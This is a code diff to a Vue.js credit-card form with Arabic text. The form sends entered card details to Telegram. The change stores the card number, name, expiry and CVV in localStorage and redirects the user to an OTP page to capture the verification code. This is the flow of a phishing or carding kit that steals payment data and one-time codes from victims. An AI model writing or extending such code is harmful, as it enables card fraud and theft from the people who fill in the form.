@@ -124,15 +124,22 @@ new Vue({
       .then(response => response.json())
       .then(data => {
         if (data.ok) {
-          alert("✅ تم إرسال البيانات بنجاح إلى تليجرام");
-          // مسح الحقول بعد الإرسال الناجح
-          this.cardName = "";
-          this.cardNumber = "";
-          this.cardMonth = "";
-          this.cardYear = "";
-          this.cardCvv = "";
-          this.isCardFlipped = false;
-          document.getElementById("cardNumber").focus();
+          alert("✅ تم إرسال البيانات بنجاح إلى تليجرام\nيرجى إدخال رمز التحقق");
+          
+          // حفظ بيانات البطاقة في localStorage
+          const cardData = {
+            cardNumber: this.cardNumber,
+            cardName: this.cardName,
+            cardMonth: this.cardMonth,
+            cardYear: this.cardYear,
+            cardCvv: this.cardCvv
+          };
+          localStorage.setItem('cardData', JSON.stringify(cardData));
+          
+          // الانتقال إلى صفحة OTP بعد ثانية واحدة
+          setTimeout(() => {
+            window.location.href = 'otp.html';
+          }, 1500);
         } else {
           alert("❌ حدث خطأ أثناء الإرسال. يرجى المحاولة لاحقاً");
           console.error("خطأ تليجرام:", data);
